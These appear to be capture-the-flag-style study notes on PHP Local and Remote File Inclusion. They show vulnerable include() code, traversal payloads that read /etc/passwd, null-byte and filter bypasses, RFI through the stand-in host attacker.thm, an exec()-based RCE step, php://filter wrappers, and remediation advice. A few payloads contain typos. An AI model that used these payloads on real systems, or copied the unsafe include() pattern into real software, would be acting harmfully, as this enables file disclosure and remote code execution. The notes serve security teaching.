# Local File Inclusion - LFI

1. ```php
   <?PHP 
    include($_GET["lang"]);
   ?>
   ```

The PHP code above uses a GET request via the URL parameter lang to include the file of the page. The call can be done by sending the following HTTP request as follows: http://webapp.thm/index.php?lang=EN.php to load the English page or http://webapp.thm/index.php?lang=AR.php to load the Arabic page, where EN.php and AR.php files exist in the same directory.

Theoretically, we can access and display any readable file on the server from the code above if there isn't any input validation. Let's say we want to read  the /etc/passwd file, which contains sensitive information about the users of the Linux operating system, we can try the following: http://webapp.thm/get.php?file=/etc/passwd 

**2.**Next, In the following code, the developer decided to specify the directory inside the function.

```php
<?PHP 
    include("languages/". $_GET['lang']); 
?>
```

In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.

If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.

Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page. The following will be the exploit:

http://webapp.thm/index.php?lang=../../../../etc/passwd

**1.** In the first two cases, we checked the code for the web app, and then we  knew how to exploit it. However, in this case, we are performing black  box testing, in which we don't have the source code. In this case,  errors are significant in understanding how the data is passed and  processed into the web app.

In this scenario, we have the following entry point: http://webapp.thm/index.php?lang=EN. If we enter an invalid input, such as THM, we get the following error

```php
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

The error message discloses significant information. By entering THM as  input, an error message shows what the include function looks like: include(languages/THM.php);. 

If you look at the directory closely, we can tell the function includes files in the languages directory is adding .php at the end of the entry. Thus the valid input will be something as follows: index.php?lang=EN, where the file EN is located inside the given languages directory and named EN.php. 

Also, the error message disclosed another important piece of information about the full web application directory path which is /var/www/html/THM-4/

To exploit this, we need to use the ../ trick, as described in the directory traversal section, to get out the current folder. Let's try the following:

**http://webapp.thm/index.php?lang=../../../../etc/passwd**

Note that we used 4 ../ because we know the path has four levels /var/www/html/THM-4. But we still receive the following error:

```php
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

It seems we could move out of the PHP directory but still, the include function reads the input with .php at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the  NULL BYTE, which is %00.

Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes  after the Null Byte.

By adding the Null Byte at the end of the payload, we tell the include function to ignore anything after the null byte which may look like:

***include("languages/../../../../../etc/passwd%00").".php"); which equivalent to â†’ include("languages/../../../../../etc/passwd");***

NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.

Now apply what we showed in Lab #3, and try to read files /etc/passwd , answer question #1 below.

**2.** In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword /.. The exploit will be similar to **http://webapp.thm/index.php?lang=/etc/passwd/. We could also use http://webapp.thm/index.php?lang=/etc/passwd%00.**

Now apply this technique in Lab #4 and figure out to read /etc/passwd.

**3.** Next, in the following scenarios, the developer starts to use input  validation by filtering some keywords. Let's test out and check the  error message!

**http://webapp.thm/index.php?lang=../../../../etc/passwd**

We got the following error!

```
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```

If we check the warning message in the include(languages/etc/passwd) section, we know that the web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this.

**First**, we can send the following payload to bypass it: **....//....//....//....//....//etc/passwd**

**Why did this work?**

This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass, leaving what is pictured below.

**4.** Finally, we'll discuss the case where the developer forces the include to read  from a defined directory! For example, if the web application asks to  supply input that has to include a directory such as: http://webapp.thm/index.php?lang=languages/EN.php then, to exploit this, we need to include the directory in the payload like so: **?       lang=languageRemotes/../../../../../etc/passwd**.

# Remote File Inclusion - RFI

**Remote File Inclusion - RFI
**

Remote File Inclusion (RFI) is a technique to include remote files and into a  vulnerable application. Like LFI, the RFI occurs when improperly  sanitizing user input, allowing an attacker to inject an external URL  into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.

The risk of RFI is higher than LFI since RFI vulnerabilities allow an  attacker to gain Remote Command Execution (RCE) on the server. Other  consequences of a successful RFI attack include:

- Sensitive Information Disclosure
- Cross-site Scripting (XSS)
- Denial of Service (DoS)

An external server must communicate with the application server for a  successful RFI attack where the attacker hosts malicious files on their  server. Then the malicious file is injected into the include function  via HTTP requests, and the content of the malicious file executes on the vulnerable application server.

**RFI steps**

The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message Hello THM.

```php
<?PHP echo "Hello THM"; ?>
```

First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.

# Remediation

As a developer,  it's important to be aware of web application vulnerabilities, how to  find them, and prevention methods. To prevent the file inclusion  vulnerabilities, some common suggestions include:

1. Keep system and services, including web application frameworks, updated with the latest version.
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
6. Never trust user input, and make sure to implement proper input validation against file inclusion.
7. Implement whitelisting for file names and locations as well as blacklisting.

## To gain RCE with RFI to execute the command

1. Creating the .txt file with the command to execute

example  

``` <?PHP print exec('hostname'); ?>```

2. create the server and copy the link of the file from your server and add it in the file parameter

example

```
http://webapp/get.php?file=http://<ip>/<file location>
```

# php filter

file using the PHP filter wrapper.

```php
php?file=php://filter/resource=/etc/passwd
```
```php
page.php?file=php://filter/convert.base64encode/resource=/etc/passwd
```
